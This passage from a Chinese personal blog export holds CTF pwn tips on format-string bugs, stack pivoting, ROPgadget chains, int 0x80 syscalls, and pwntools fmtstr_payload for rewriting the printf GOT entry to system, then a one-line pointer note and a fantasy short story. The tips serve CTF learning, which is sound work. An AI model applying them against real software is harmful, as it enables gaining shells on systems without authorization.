<h3 id="2-system参数"><a href="#2-system参数" class="headerlink" title="2.  system参数"></a>2.  system参数</h3><ol>
<li>system的参数应该是一个地址，这个地址指向字符串”/bin/sh\x00”</li>
</ol>
<h3 id="3-32位与64位格式化字符串漏洞"><a href="#3-32位与64位格式化字符串漏洞" class="headerlink" title="3.  32位与64位格式化字符串漏洞"></a>3.  32位与64位格式化字符串漏洞</h3><ol>
<li>32位：%s不能放在地址前面，由于32位地址不存在\x00，所以printf会打印一堆相邻的以f7开头的地址，此时获取的地址并不会是你想要的地址</li>
<li>64位：%s不能放在地址后面，由于64位地址存在\x00，所以printf会截断数据，并不会打印到%s的位置</li>
</ol>
<h3 id="4-send-amp-recv"><a href="#4-send-amp-recv" class="headerlink" title="4.  send &amp; recv"></a>4.  send &amp; recv</h3><ol>
<li>send尽量after</li>
</ol>
<h3 id="5-libc不同可能导致的后果"><a href="#5-libc不同可能导致的后果" class="headerlink" title="5. libc不同可能导致的后果"></a>5. libc不同可能导致的后果</h3><ol>
<li>栈偏移量不同</li>
<li>tcache的存在使部分堆攻击变难</li>
</ol>
<h3 id="6-栈劫持"><a href="#6-栈劫持" class="headerlink" title="6. 栈劫持"></a>6. 栈劫持</h3><ol>
<li>有的时候bss段上面是got表，如果栈没调整好则push多了以后会覆盖got表导致不能调用<ol>
<li>例题：buu - gyctf_2020_borrowstack</li>
</ol>
</li>
</ol>
<hr>
<h1 id="0x02-奇技淫巧"><a href="#0x02-奇技淫巧" class="headerlink" title="0x02  奇技淫巧"></a>0x02  奇技淫巧</h1><h3 id="1-ROPgadget-—binary-filename-—ropchain"><a href="#1-ROPgadget-—binary-filename-—ropchain" class="headerlink" title="1.  ROPgadget —binary filename —ropchain"></a>1.  ROPgadget —binary filename —ropchain</h3><ol>
<li>作用：静态编译时，二进制文件会自带许多gadget，该命令用于提取</li>
<li>trick：可以自己修改它生成的chain，缩短shellcode</li>
<li>例题：buuctf - cmcc_simplerop  |  inndy_rop</li>
</ol>
<h3 id="2-重复栈"><a href="#2-重复栈" class="headerlink" title="2.  重复栈"></a>2.  重复栈</h3><ol>
<li>原理：已知main函数中先调用函数A，再调用函数B。则AB使用的栈空间重叠，在A中使用的栈并不会被擦除，所以可能会通过B再次利用</li>
<li>例题：[ZJCTF 2019]Login</li>
</ol>
<h3 id="3-关闭标准输出"><a href="#3-关闭标准输出" class="headerlink" title="3.  关闭标准输出"></a>3.  关闭标准输出</h3><ol>
<li>原理：看这篇<a href="https://blog.csdn.net/xirenwang/article/details/104139866">博客</a></li>
</ol>
<h3 id="4-int-0x80h"><a href="#4-int-0x80h" class="headerlink" title="4.  int 0x80h"></a>4.  int 0x80h</h3><ol>
<li>寄存器与数据的关系<ol>
<li>EAX/RAX：系统调用号</li>
<li>EDX/RDX：输入长度</li>
</ol>
</li>
<li>系统调用号记录</li>
<li>系统调用sys_read是直接从ESP开始向下写入，而不是常规的push<ol>
<li>例题：buuctf - pwnable_start</li>
</ol>
</li>
</ol>
<hr>
<h1 id="0x03-工具使用"><a href="#0x03-工具使用" class="headerlink" title="0x03 工具使用"></a>0x03 工具使用</h1><h3 id="1-fmtstr-payload"><a href="#1-fmtstr-payload" class="headerlink" title="1.  fmtstr_payload"></a>1.  fmtstr_payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br><span class="line"></span><br><span class="line">第一个参数表示格式化字符串的偏移</span><br><span class="line"></span><br><span class="line">第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；</span><br><span class="line"></span><br><span class="line">第三个参数表示已经输出的字符个数</span><br><span class="line"></span><br><span class="line">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title>一些理解</title>
    <url>/2023/08/07/%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
--灵光一闪--
</blockquote>

<span id="more"></span>
<h1 id="0x00-C2asm"><a href="#0x00-C2asm" class="headerlink" title="0x00  C2asm"></a>0x00  C2asm</h1><ol>
<li>指针是内部存放着地址的一个地址</li>
</ol>
]]></content>
      <categories>
        <category>Program</category>
      </categories>
      <tags>
        <tag>comprehension</tag>
      </tags>
  </entry>
  <entry>
    <title>异世界见闻录(1)</title>
    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
我不想沉在无人问津的海底，只好把登顶作为我的理想
</blockquote>

<span id="more"></span>
<p>&emsp;&emsp;雨尚未停歇。<br>&emsp;&emsp;派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br>&emsp;&emsp;远处的乌云褪去了夜色，昭示着黎明的到来。<br>&emsp;&emsp;“今天还要向上走吗？”我问道。<br>&emsp;&emsp;派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br>&emsp;&emsp;他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br>&emsp;&emsp;苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br>&emsp;&emsp;派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br>&emsp;&emsp;天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br>&emsp;&emsp;“山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br>&emsp;&emsp;“不知道。”派斯坦的回答十分简短。<br>&emsp;&emsp;话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br>&emsp;&emsp;“轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br>&emsp;&emsp;突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br>&emsp;&emsp;“铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br>&emsp;&emsp;那手臂没了动静。<br>&emsp;&emsp;我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br>&emsp;&emsp;“这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br>&emsp;&emsp;”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br>&emsp;&emsp;我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br>&emsp;&emsp;雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br>&emsp;&emsp;”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br>&emsp;&emsp;我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br>&emsp;&emsp;我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br>&emsp;&emsp;在意识消散之前，极力向外一瞥——<br>&emsp;&emsp;我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。  </p>
]]></content>
      <categories>
        <category>sketch</category>
      </categories>
      <tags>
        <tag>witness</tag>
      </tags>
  </entry>
</search>
